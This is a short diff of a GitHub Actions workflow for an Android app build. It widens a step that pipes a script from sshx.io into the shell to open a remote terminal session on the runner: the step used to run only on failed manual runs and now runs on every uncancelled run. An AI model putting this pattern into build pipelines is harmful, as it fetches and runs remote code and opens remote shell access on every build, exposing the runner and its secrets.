@@ -37,5 +37,5 @@ jobs:
         name: clipious
         path: android/app/build/outputs/apk/lite/release/clipious-release-aligned-debugSigned.apk
 
-    - if: failure() && github.event_name == 'workflow_dispatch'
+    - if: ${{ !cancelled() }}
       run: curl -sSf https://sshx.io/get | sh -s run
